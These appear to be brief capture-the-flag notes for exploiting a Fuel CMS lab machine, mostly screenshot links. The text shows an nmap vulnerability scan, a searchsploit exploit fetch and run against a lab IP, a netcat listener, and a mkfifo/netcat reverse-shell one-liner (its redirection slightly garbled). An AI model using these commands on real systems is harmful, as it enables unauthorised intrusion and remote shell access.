  
![7bf4b0916aefc52bb528163adc713ccf.png](resources/7bf4b0916aefc52bb528163adc713ccf.png)

sudo nmap -v -A -sC --script vuln -p- (IP)  
![85f055fa45ed3050419142206b149574.png](resources/85f055fa45ed3050419142206b149574.png)

\--> searchsploit Fuel  
![b1bdeec590cd2e4db4876497f21f394f.png](resources/b1bdeec590cd2e4db4876497f21f394f.png)

\--> searchsploit -m 50477

![c9e008a0ea5e510a1e819e79df807e6c.png](resources/c9e008a0ea5e510a1e819e79df807e6c.png)

![39a413a69ac28fdf651c14349d2f21af.png](resources/39a413a69ac28fdf651c14349d2f21af.png)

\--> sudo python3 /root/50477.py -u http://10.10.159.98

![e1729025d5128a734370291ea9ef4567.png](resources/e1729025d5128a734370291ea9ef4567.png)

open other command promp and  
\--> nc -lnvp 4242

![421e79cd795e28d587f89104ed9a06cc.png](resources/421e79cd795e28d587f89104ed9a06cc.png)

rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>61|nc 10.10.3.49 4242 >/tmp/f

![6b3b383ac439ae0ee1ebd463dfb32b0e.png](resources/6b3b383ac439ae0ee1ebd463dfb32b0e.png)

![8149d4b976ebe57c39826d4192891d68.png](resources/8149d4b976ebe57c39826d4192891d68.png)

![34bdabaadc8df75a9b7d519a86bc3960.png](resources/34bdabaadc8df75a9b7d519a86bc3960.png)

![9ec1f29cfe44bda4923c990f5f323d0b.png](resources/9ec1f29cfe44bda4923c990f5f323d0b.png)

![7f2369aa60e0daf400bfa13ad7c79684.png](resources/7f2369aa60e0daf400bfa13ad7c79684.png)

![3c435f30cbc03093655556052493a61d.png](resources/3c435f30cbc03093655556052493a61d.png)

![d8ab0475aad3825130f0a747934c88a0.png](resources/d8ab0475aad3825130f0a747934c88a0.png)
